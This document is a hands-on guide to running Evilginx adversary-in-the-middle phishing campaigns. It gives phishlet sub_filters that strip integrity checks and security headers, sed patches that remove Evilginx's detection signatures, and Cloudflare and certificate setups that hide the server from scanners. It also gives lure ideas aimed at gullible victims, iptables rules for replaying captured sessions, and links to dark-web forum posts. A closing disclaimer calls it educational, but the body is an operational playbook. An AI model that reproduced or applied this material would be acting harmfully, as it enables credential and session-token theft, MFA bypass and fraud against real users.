**PHISHLETS CONFIGURATION!**

➺ Only create proxy hosts for traffic whose responses contain your target's hostname. For example, if targeting Microsoft, proxy only traffic with Microsoft hostnames in the response (response body, headers); ignore traffic that does not contain Microsoft hostnames in the response.

➺ Always check for Glassbox network traffic when reverse proxying — it’s a security tool.
It may send collected data to external URLs (block them if needed) and might compare the DOM to a static version.

➺ I have seen people setting up `phish_sub` with the same pattern as `orig_sub`, (e.g. `phish_sub: 'secure', orig_sub: 'secure'`) don't do that!.

➺ Set up DNS A records `@` AND `*` pointing to you VPS IP.

➺ BUYING EXPIRED DOMAINS DOES NOT WORK ANYMORE!

➺ DO NOT use `autocert: on`, you are gonna appear on a lot of public CT records, use [CloudFlare origin certificate](https://developers.cloudflare.com/ssl/origin-configuration/origin-ca/) instead, ([no](https://breakdev.org/evilginx-3-3-go-phish/) [need](https://x.com/mrgretzky/status/1763584080245887320?lang=en) [to modify](https://github.com/kgretzky/evilginx2/commit/3b0f5c9971bf1041acc88d1b6ffcb9a5203f261c#diff-ecec88c33adb7591ee6aa88e29b62ad52ef443611cba5e0f0ecac9b5725afdbaR2) [source](https://www.youtube.com/watch?v=zp3u3xSuCpQ&t=254s), evilginx [supports](https://www.youtube.com/watch?v=Rz3tvy0455M) it [by default](https://www.jackphilipbutton.com/post/how-to-protect-evilginx-using-cloudflare-and-html-obfuscation)!.

➺ Remember to change CloudFlare's mode to [Full](https://developers.cloudflare.com/ssl/origin-configuration/ssl-modes/full/) (Not [Full Strict](https://developers.cloudflare.com/ssl/origin-configuration/ssl-modes/full-strict/).

➺ If you are phishing people from a specific country, [configure Cloudflare](https://developers.cloudflare.com/waf/custom-rules/use-cases/allow-traffic-from-specific-countries/) to present I'm under attack mode if an IP out of your country hits your site.

➺ Enable [BotFight mode](https://developers.cloudflare.com/bots/get-started/bot-fight-mode/#enable-bot-fight-mode) and [AI Bots Fight mode](https://developers.cloudflare.com/bots/get-started/bot-fight-mode/#block-ai-bots) on CloudFlare.

➺ I recommend having real content on 'www' pointing to your A record as adviced [here](https://github.com/aalex954/evilginx2-TTPs?tab=readme-ov-file#site-classification).

➺ Remember that `key: ''` parameter is not valid when capturing `json` tokens, [see documentation](https://help.evilginx.com/community/phishlet-format#json-example).

➺ Using a CDN for email sendouts will significantly reduce email scanner detection!.

➺ [OpenGraph](https://help.evilginx.com/community/guides/lures#opengraph) makes phishing more credible, an email with embedded images increases its fraudscore... Instead you can use opengraph, reduce fraudscore and make it more believable, be creative.

➺ Emails with URLs embedded in words also increase fraudscore!.

➺ Customize the subdomains of your lure with `lures edit <id> hostname <hostname>`, remember that you can only customize the subdomains and set as many subdomains as you want as long as your dns records/wildcard records cover that (CloudFlare origin certificate with Full mode allows it).

➺ You can cusomize the lure path with `lures edit <id> path <path>`, the original 8 random string is very obvious and detectable.

**These subfilters are a must:**

```
  - {triggers_on: '', orig_sub: '', domain: '', search: '\\((["'])integrity(["']),.*\\)', replace: '(${1}integrity${2})', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript', 'text/html', 'application/json', 'image/svg+xml', 'text/plain']}

  - {triggers_on: '', orig_sub: '', domain: '', search: '\\((["'])crossorigin(["']),.*\\)', replace: '(${1}crossorigin${2})', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript', 'text/html', 'application/json', 'image/svg+xml', 'text/plain']}

  - {triggers_on: '', orig_sub: '', domain: '', search: 'crossorigin=(["']).*(["']), replace: 'crossorigin=${1}${2}', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript', 'text/html', 'application/json', 'image/svg+xml', 'text/plain']}

  - {triggers_on: '', orig_sub: '', domain: '', search: 'integrity=(["']).*(["']), replace: 'integrity=${1}${2}', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript', 'text/html', 'application/json', 'image/svg+xml', 'text/plain']}

  - {triggers_on: '', orig_sub: '', domain: '', search: '([A-Za-z0-9._]+)*location(\\.href|\\.hostname|\\.origin|\\.host|\\.domain|\\.toString|\\.site)([ ]*[;)],}|\n])', replace: '${1}location${2}.replace("phishdomain.com", "legit.domain.com")${3}', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript', 'text/html', 'application/json', 'image/svg+xml', 'text/plain']}

  - {triggers_on: '', orig_sub: '', domain: '', search: '\\(window\\.location(\\.href|\\.hostname|\\.origin|\\.host|\\.domain|\\.toString|\\.site)([\s]+)*===([\s]+)*'phishdomain\\.com'\\)', replace: '(window.location${1}${2}===${3}'legit.domain.com')', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript', 'text/html', 'application/json', 'image/svg+xml', 'text/plain']}
```

➺ if you already have `auto_filter: true`, it's not necessary to rewrite hostnames with subfilters, unless they look like `<legitsite>.com` or `legitsite\.com` (with hardcoded literal backslash)

**These are some keywords related to [Canary](https://insights.spotit.be/2024/06/03/clipping-the-canarys-wings-bypassing-aitm-phishing-detections/) [Tokens](https://nicolasuter.medium.com/aitm-phishing-with-azure-functions-a1530b52df05) and [Redirection](https://www.obsidiansecurity.com/blog/demystifying-okta-aitm) [Urls](https://www.riskinsight-wavestone.com/en/2025/07/phishing-pushing-evilginx-to-its-limit/) you should look out for:**

```
redirect_uri
redirect_url
redirecturi
redirecturl
customcssurl
background: url
.gif
issueorigin
```

**There are critical meta tags you must strip with `sub_filters`, e.g.:**

```
  - {triggers_on: '', orig_sub: '', domain: '', search: '<meta.*(X-Permitted-Cross-Domain-Policies|X-Evilginx|Cross-Origin-Opener-Policy|Cross-Origin-Embedder-Policy|Cross-Origin-Resource-Policy|X-Apple-Auth-Attributes|X-Content-Security-Policy|X-Cache-Status|X-Cache|X-Permitted-Cross-Domain-Policies|X-Client-Data|Via|Forwarded|Public-Key-Pins|X-Forwarded-Host|Content-Security-Policy|Content-Security-Policy-Report-Only|Strict-Transport-Security|X-XSS-Protection|X-Content-Type-Options|X-Frame-Options|X-Forwarded-For|X-Real-IP|X-Client-IP|Connecting-IP|True-Client-IP|Client-IP).*>', replace: '', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript', 'text/html', 'application/json', 'image/svg+xml', 'text/plain', 'font/woff2', 'charset=utf-8']}
```

**There is gonna be security in the JS/XML responses, you must downgrade it in order to have a succesful phish, e.g.:**

```
CorsEnabled: !0
domRecordEnabled = true
sendTopURL: !0
reportDisableCors: !1
recordCSPViolations: !0
botDetection = 1
AdobeAnalyticsIntegration: !0
GoogleAnalyticsIntegration = 1
domTamperingDetectionEnabled: !0
enableSessionizingByCors = true
fingerprintIncludeUniqueIdentifier: !0
```

**I honestly recommend to not send emails, use third party services with creative-attractive offers, here are some ideas:**

- A LinkedIn job offer with a form that redirects to the final phishing page
- An attractive and cheap product offer with cash-on-delivery (Messenger, Instagram or even ADS campaigns)
- Offer "Free Instagram/Tik Tok" followers
- Maybe go to a discord music interchange channel and offer cheap spotify giftcards

Or any shit that conventional people with zero self-questioning would fall for, just **BE CREATIVE**

---

**This is a list of sed -i commands that aim to modify Evilginx source (use it in the following order):**

**[Remove deprecated io/ioutil](https://github.com/kgretzky/evilginx2/pull/1050)**

```
sed -i '/io\/ioutil/d' evilginx2/core/certdb.go
sed -i 's/ioutil\.ReadFile/os.ReadFile/g' evilginx2/core/certdb.go
sed -i 's/ioutil\.WriteFile/os.WriteFile/g' evilginx2/core/certdb.go
sed -i '/io\/ioutil/d' evilginx2/core/http_proxy.go
sed -i 's/ioutil\.ReadFile/os.ReadFile/g' evilginx2/core/http_proxy.go
sed -i 's/ioutil\.ReadAll/io.ReadAll/g' evilginx2/core/http_proxy.go
sed -i 's/ioutil\.NopCloser/io.NopCloser/g' evilginx2/core/http_proxy.go
sed -i '/io\/ioutil/d' evilginx2/core/terminal.go
sed -i 's/ioutil\.ReadDir/os.ReadDir/g' evilginx2/core/terminal.go
sed -i 's/ioutil\.ReadAll/io.ReadAll/g' evilginx2/core/terminal.go
sed -i 's/"io\/ioutil"/"io"/g' evilginx2/core/utils.go
sed -i 's/ioutil\.ReadAll/io.ReadAll/g' evilginx2/core/utils.go
```

**Add missing mimes to auto_filter**

```
sed -i 's/"text\/html", "application\/json", "application\/javascript", "text\/javascript", "application\/x-javascript"/"text\/html", "application\/json", "application\/javascript", "text\/javascript", "application\/x-javascript", "application\/ion+json", "text\/plain", "image\/svg+xml"/g' evilginx2/core/http_proxy.go
sed -i 's/"text\/html", "application\/javascript", "text\/javascript", "application\/json"/"text\/html", "application\/json", "application\/javascript", "text\/javascript", "application\/x-javascript", "application\/ion+json", "text\/plain", "image\/svg+xml"/g' evilginx2/core/http_proxy.go
sed -i '
:a
N
/\t\t\t\tresp.Header.Set("Access-Control-Allow-Credentials", "true")\n\t\t\t}/s/}/}\n/
P
D
' evilginx2/core/http_proxy.go
```

**Add missing TLDs for auto_filter**

```
sed -i 's/|yu|za|zm|zw/|yu|za|zm|zw|asp|social|bank|finance|money|invest|capital|credit|insurance|app|store/' evilginx2/core/http_proxy.go
```

**Remove [static signatures](https://github.com/An0nUD4Y/Evilginx-Phishing-Infra-Setup/blob/main/README.md?plain=1#L188) from unauth_redirect, add Headers security headers for unauth_redirect and base64 encode the unauth_redirect logic**

```
sed -i '1311a\ resp.Header.Set("Referrer-Policy", "no-referrer")\n resp.Header.Set("Cache-Control", "no-store")\n resp.Header.Set("X-Content-Type-Options", "nosniff")\n resp.Header.Set("X-Frame-Options", "DENY")\n resp.Header.Set("Content-Security-Policy", "default-src 'none'; script-src 'unsafe-eval' 'self'")' evilginx2/core/http_proxy.go
sed -i "s|body := fmt.Sprintf(\"<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>\", rurl)|js := fmt.Sprintf(\"top.location.href='%s';\", rurl)\n\tencodedJs := base64.StdEncoding.EncodeToString([]byte(js))\n\tbody := fmt.Sprintf(\"<html><head><script>eval(atob('%s'));</script></head><body></body></html>\", encodedJs)|g" evilginx2/core/http_proxy.go
sed -i 's|fmt\.Sprintf("top\.location\.href='\''%s'\'';", rurl)|fmt.Sprintf("top.location.href=%s;", strconv.Quote(rurl))|g' evilginx2/core/http_proxy.go
```

**[Allow path regex and block headers](https://github.com/An0nUD4Y/Evilginx2-Phishlets/blob/master/README.md?plain=1#L41)**

```
sed -i 's/regexp\.Compile("\^" + d + "\$")/regexp.Compile(d)/' evilginx2/core/phishlet.go
```

**Block http extra headers**

```
sed -i '/var rm_headers = \[\]string{/a\\t\t\t\t"X-Permitted-Cross-Domain-Policies",\n\t\t\t\t"X-Evilginx",\n\t\t\t\t"Cross-Origin-Opener-Policy",\n\t\t\t\t"Cross-Origin-Embedder-Policy",\n\t\t\t\t"Cross-Origin-Resource-Policy",\n\t\t\t\t"X-Apple-Auth-Attributes",\n\t\t\t\t"X-Content-Security-Policy",\n\t\t\t\t"X-Cache-Status",\n\t\t\t\t"X-Cache",\n\t\t\t\t"X-Permitted-Cross-Domain-Policies",\n\t\t\t\t"X-Client-Data",\n\t\t\t\t"Via",\n\t\t\t\t"Forwarded",\n\t\t\t\t"Public-Key-Pins",\n\t\t\t\t"X-Forwarded-Host",\n\t\t\t\t"Public-Key-Pins-Report-Only"' evilginx2/core/http_proxy.go
```

**Remove all evilginx easter eggs**

```
sed -i 's/^.*o_host := req.Host/\/\/ o_host := req.Host/' evilginx2/core/http_proxy.go
sed -i 's/^.*req.Header.Set(p.getHomeDir(), o_host)/\/\/ req.Header.Set(p.getHomeDir(), o_host)/' evilginx2/core/http_proxy.go
sed -i '/^func (p \*HttpProxy) getHomeDir() string {/,/^}$/ { s/^/\/\// }' evilginx2/core/http_proxy.go
sed -i '/^const (/ { :a; N; /\n)$/!ba; /HOME_DIR = ".evilginx"/ s/^\(.*\)$/\/\/\1/Mg }' evilginx2/core/http_proxy.go
```

**Allow Cloudflare traffic**

```
sed -i 's_proxyHeaders := \[\]string{\"_&CF-Connecting-IP\", \"_' evilginx2/core/http_proxy.go
```

**Remove [detectable cookie dash](https://github.com/An0nUD4Y/Evilginx-Phishing-Infra-Setup/blob/main/README.md?plain=1#L259)**

```
sed -i '/s_hash = s_hash\[:4\] + "-" + s_hash\[4:\]/d' evilginx2/core/http_proxy.go
```

**Optionally, add these functionalities (very useful):**

You can also modify source (not included here) in order to inject the latest generated tokens to chromium (chromium will use the same proxy configured for Evilginx), see it [here](https://github.com/kgretzky/evilginx2/pull/1189).

You can also modify source (not included here) in order to allow [Header Overwriting](https://github.com/kgretzky/evilginx2/pull/1006)

You can also modify source (not included here) in order to allow [Force Get](https://github.com/kgretzky/evilginx2/pull/1163)

---

**[Configure a proxy for evilginx](https://help.evilginx.com/community/guides/proxy)**

**[Low fraud score is not bullshit](https://www.blackhatworld.com/seo/low-fraud-score-proxies.1490657/post-16304635).**

But when most people say “low fraud score” they mean to say “Google reCAPTCHA score”.

Do you want to test a proxy to see if it is as clean as possible?

First of all check the proxy here for any blacklists:

[WhatIsMyIPAddress.com](https://whatismyipaddress.com/blacklist-check)

Second, connect to your proxy and go to this site [recaptcha-demo.appspot.com](https://recaptcha-demo.appspot.com/) → Request Scores

This is reCaptcha v3 and it will detect if a user is bot like or not then it will rate it out of 1.0.

I have discovered that this is the way Google ranks their users.

If you connect directly and your score is 0.1. The proxy is bad get rid of it.

If you get a score of 0.3 then its good. The reason why it's 0.3 is because Google will check if your PC has any information (if you have cookies etc) if its a clean new browser the score starts at 0.3

But as soon as you navigate through a couple of sites you will get 0.7+.

If it is 0.1 its because the IP has been blacklisted as Botted Recently.

**If you have static IP proxies and you want to improve their score, hire someone to make a bot that surfs the web with them, over time, their score will increase.**

Cheers!

Always use this before entering your captured session:

```
sudo iptables -A OUTPUT -p udp --dport 443 -j REJECT
sudo iptables -P OUTPUT DROP
sudo iptables -A OUTPUT -o lo -j ACCEPT
sudo iptables -A OUTPUT -d <PROXY IP> -p tcp --dport <PROXY PORT> -j ACCEPT
sudo iptables -A OUTPUT -p udp -d 127.0.0.1 --dport 53 -j ACCEPT
dns2socks <PROXY IP>:$<PROXY PORT> 8.8.8.8:53 127.0.0.1:53 &
```

You can undo it with this:

```
sudo iptables -F
sudo iptables -t nat -F
sudo iptables -t mangle -F
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
```

---

**This is my personal workflow:**

```
**CLOUDFLARE:**

SET UP DNS A RECORDS WITH NAME "@" AND "*" POINTING TO VPS IP WITH PROXY STATUS OFF

**EVILGINX (TERMINAL):**

sudo -s

git clone https://github.com/kgretzky/evilginx2.git

cd evilginx2

go build -o evilginx

nano evilginx2/phishlets/custom.yaml ← paste yaml

sudo ./evilginx

blacklist all

config unauth_url (https://google.com) ← This is the url that scannners hitting hidden phishlet or people without the lure path will fetch

config domain (domain name)

config ipv4 (VPS IP)

phishlets create custom.yaml

phishlets hostname (phishlet name) (domain name) ← This will add the hostname to the phishlet

lures create custom.yaml

config autocert off

**CLOUDFLARE:**

Go to cloudlfare DNS, set cloudflare proxy on

Go to SSL/TLS>Overview and set it to Full

Go to SSL/TLS>Origin Server>Create Certificate>Hostnames [*.phish.com][phish.com]>Create

PASTE "BEGIN CERTIFICATE" HERE:

nano /root/.evilginx/crt/sites/phish.com/fullchain.pem
nano /root/.evilginx/crt/ca.crt

PASTE "PRIVATE KEY" HERE:

nano /root/.evilginx/crt/sites/phish.com/privkey.pem
nano /root/.evilginx/crt/ca.key

Security>Bots>Bot Fight Mode> On

Security>Settings>Bot traffic>Block AI bots> On

Security>WAF>Create Rule ← There is a WAF option that presents I am under attack to IPs outside allowed range

**EVILGINX (TERMINAL):**

phishlets enable (phishlet name) ← This will enable LetsEncrypt autocert **if autocert were on**

lures create (phishlet name) ← This will create the lure

lures edit (lure number) hostname (customize.subdomain.to.whatever.you.like.phish.com)

lures edit (lure number) redirect_url (about:blank) ← sets redirect url that user will be navigated to on successful authorization, for a lure with a given <id>

lures edit (lure number) ua_filter (e.g. android|iphone|windows)

lures edit (lure number) redirector evilginx2/redirectors/download_example/index.html

lures get-url (lure number)

lures edit (lure number) path (/any/path/you/want)

blacklist unauth
```
---

**SOURCES:**

_GOOD OPSEC_

https://www.syonsecurity.com/post/protecting-evilginx3
https://hackyourmom.com/en/osvita/yak-proksyruvaty-zyednannya-mizh-korystuvachem-i-czilovym-vebserverom/
https://zolder.io/blog/phishing-for-refresh-tokens/

_USING REDIRECTOR!_

https://fluxxset.com/t/evilginx-template-and-redirector/907/4
https://fluxxset.com/t/cloudflare-authentication-needed/1226/12
https://fluxxset.com/t/evilginx2-0-doc/62
https://github.com/ss23/evilginx2?tab=readme-ov-file
the EvilGoPhish project provide known user agents and IPs to block.
https://posts.specterops.io/feeding-the-phishes-276c3579bba7
https://github.com/kgretzky/evilginx2/blob/master/redirectors/turnstile/index.html
https://github.com/fin3ss3g0d/evilgophish/blob/main/evilginx3/templates/turnstile.html#L19
https://github.com/fin3ss3g0d/evilgophish/blob/main/README.md#cloudflare-turnstile-setup
https://fin3ss3g0d.net/index.php/2024/04/08/evilgophishs-approach-to-advanced-bot-detection-with-cloudflare-turnstile/

_TLS (WILDCARD) TUTORIALS_

https://breakdev.org/evilginx-3-3-go-phish/
https://x.com/mrgretzky/status/1763584080245887320?lang=en
https://github.com/kgretzky/evilginx2/commit/3b0f5c9971bf1041acc88d1b6ffcb9a5203f261c#diff-ecec88c33adb7591ee6aa88e29b62ad52ef443611cba5e0f0ecac9b5725afdbaR2
https://www.youtube.com/watch?v=zp3u3xSuCpQ&t=254s

_BLACKLIST_

https://github.com/aalex954/MSFT-IP-Tracker/releases/latest/download/msft_asn_ip_ranges.txt
https://endpoints.office.com/endpoints/worldwide?clientrequestid=b10c5ed1-bad1-445f-b386-b919946339a7
https://learn.microsoft.com/en-us/microsoft-365/enterprise/urls-and-ip-address-ranges?view=o365-worldwide
https://github.com/aalex954/evilginx2-TTPs/blob/master/Custom/blacklist.txt
https://github.com/mromk94/evilginx_modified_telegram_notifications/commit/261a0489a5820259c15c4403ba3b0acc2c922416

_YAML_

https://github.com/t3hbb/citrixphishlet/blob/main/NewCitrix.yaml
https://github.com/hidden9090/evilginx/blob/main/paypal.yaml
https://github.com/McClew/phishlets/blob/main/datto-portal.yaml
https://github.com/cybersecurityteampk/evilginx3-phishlets-2025/blob/main/chase.yaml

_FIRST TWO TUTORIALS_

https://www.youtube.com/watch?v=IdVvpDDhdfo
https://www.youtube.com/watch?v=z5gLXmXIyH8

_DREAD_

http://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad[.]onion/search/?p=3&q=phishlet&fuzziness=auto
http://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad[.]onion/post/dbb965bd101be7573793/#c-cb9a6ed45a7d732089
http://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad[.]onion/post/f92e106480de655cbc0b/#c-896c89ca111f1dd3e5
http://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad[.]onion/post/c0cc8b45919ce67700da/#c-03c0e9de0e4b803b0c
http://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad[.]onion/post/1707a2c3d1308b5578d1/#c-4844680af1c5052a6f
http://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad[.]onion/post/9cb7fd61cdde9c685df9
http://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad[.]onion/post/bb2d243c29b4d00dd336/#c-7164359ec634796951
http://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad[.]onion/u/jokali

_CUSTOM PHISHLET TUTORIAL_

https://www.youtube.com/watch?v=Evc7C1sGujw

_CDN_

https://www.cloudcook.ch/set-up-your-own-evilginx-proxy/
https://stevesec.com/?p=76

_EXTRA OPSEC_

https://www.reddit.com/r/redteamsec/comments/1hrzywl/evilginx_detection/
https://github.com/aalex954/evilginx2-TTPs

_PHISHLETS OFFICIAL DOCUMENTATION_

https://help.evilginx.com/community/phishlet-format#auth_tokens

_DECRYPT ENCRYPTED PASSWORDS "Getting the master password"_

https://pberba.github.io/security/2020/05/28/lastpass-phishing/

_SETUP_

https://github.com/undertheme/evilginx
https://www.youtube.com/watch?v=m2xFl1Krspo
https://github.com/An0nUD4Y/Evilginx-Phishing-Infra-Setup
https://github.com/An0nUD4Y/Evilginx2-Phishlets
https://www.hackingarticles.in/evilginx2-advanced-phishing-attack-framework/
https://janbakker.tech/evilginx-resources-for-microsoft-365/
https://medium.com/trac-labs/aitm-phishing-hold-the-gabagool-analyzing-the-gabagool-phishing-kit-531f5bbaf0e4
https://fluxxset.com/t/hiding-evilginx-server-ip-using-cloudflare/973 (Cloudflare SSL Keys Implementation)
https://www.youtube.com/watch?v=Rz3tvy0455M
https://www.jackphilipbutton.com/post/how-to-protect-evilginx-using-cloudflare-and-html-obfuscation
https://bleekseeks.com/blog/evilnginx-bypassing-mfa-phishing-is-back-on-the-menu
https://breakdev.org/evilginx-3-3-go-phish/
https://fluxxset.com/t/my-phishlets-keeps-getting-flagged/1341

_OBFUSCATION_

https://www.r-tec.net/r-tec-blog-evade-signature-based-phishing-detections.html
https://github.com/BinBashBanana/html-obfuscator


_FLUXXSET METHODS (DEBUGGING)_

https://fluxxset.com/t/why-do-my-lure-gets-red-after-building/1162/2

_BIG CHATTING (co=) CAPTHA EXPLANATION (url path rewriting)_

http://fluxxset.com/t/i-have-issues-trying-to-to-sur-pass-this-captcha-part-in-my-yahoo-phishlet/141/19
https://fluxxset.com/t/i-have-issues-trying-to-to-sur-pass-this-captcha-part-in-my-yahoo-phishlet/141
https://github.com/An0nUD4Y/Evilginx2-Phishlets#securing-evilginx-infra-tips
https://research.aurainfosec.io/pentest/hook-line-and-phishlet/
https://www.reddit.com/search/?q=evilginx&cId=6bee20fd-0522-4f79-8e4e-27eb38325b27&iId=1fa0ca77-9565-4fd2-97ae-90999bf65258

_VERY USEFUL BLOGS_

https://insights.spotit.be/2024/06/03/clipping-the-canarys-wings-bypassing-aitm-phishing-detections/#Using-Content-Security-Policies-to-our-advantage
https://insights.spotit.be/2024/06/03/clipping-the-canarys-wings-bypassing-aitm-phishing-detections/#conclusion
https://www.riskinsight-wavestone.com/en/2025/07/phishing-pushing-evilginx-to-its-limit/
https://medium.com/@yudasm/bypassing-windows-hello-for-business-for-phishing-181f2271dc02

_THE IMPORTANCE OF TLS (WILDCARD CERTIFICATES)_

https://fluxxset.com/t/my-phishlets-keeps-getting-flagged/1341/2

_REGEXP_

https://github.com/kgretzky/evilginx2/wiki/Phishlet-File-Format-(2.3.0)

_`intercept:` IN PHISHLETS_

https://breakdev.org/evilginx-3-2/

_JS_INJECT_

Prefill via `js_inject`
https://www.youtube.com/watch?v=-viRYmdb7mc
https://breakdev.org/evilginx-2-3-phishermans-dream/
https://breakdev.org/evilginx-3-2/
https://cilynx.com/how-to/evilginx2-vs-2fa-phishing/1908/
https://fluxxset.com/t/cors-headers-request-blocked/275
https://fluxxset.com/t/content-security-policies-on-ste/1041/4
https://fluxxset.com/t/evilginx-and-cors/1053

_BLOCK SUSPICIOUS USER AGENT_

https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious_http_user_agents_list.csv

_JWT TOKENS (my friend there haha!)_

https://fluxxset.com/t/jtw-tokens-explained/53XSR2

_UBUNTU ERROR_

https://uberzachattack.xyz/posts/evilginx-mastery-review/

_VPS ADVANCED SETUP_

https://gist.github.com/dunderhay/d5fcded54cc88a1b7e12599839b6badb

_OVERWRITE HEADERS_

https://github.com/kgretzky/evilginx2/pull/1006
https://github.com/kgretzky/evilginx2/pull/1006/commits/d88b98c0d31ce662809797d0942bab101a18270d
https://insights.spotit.be/2024/06/03/clipping-the-canarys-wings-bypassing-aitm-phishing-detections/#No-Referrer-Pretty-please

_FORCE GET AND FORCE POST_

https://www.obsidiansecurity.com/blog/demystifying-okta-aitm
https://github.com/kgretzky/evilginx2/pull/1163

---

DISCLAIMER:

The information herein is provided solely for educational purposes, to illuminate the capabilities of contemporary phishing techniques and methodologies. I disclaim any responsibility for harm resulting from the misuse of this knowledge. Users are strongly urged to safeguard sensitive accounts with FIDO2 authentication keys. To any would-be attackers, I implore you to refrain from abusing this information and to remain cognizant of the potential legal and ethical consequences. Do no harm; adhere to the principle of treating others as you wish to be treated. The notion of “sheep and wolves” reflects a selfish worldview—one should instead employ intellect and skill in service of constructive and ethical endeavors.
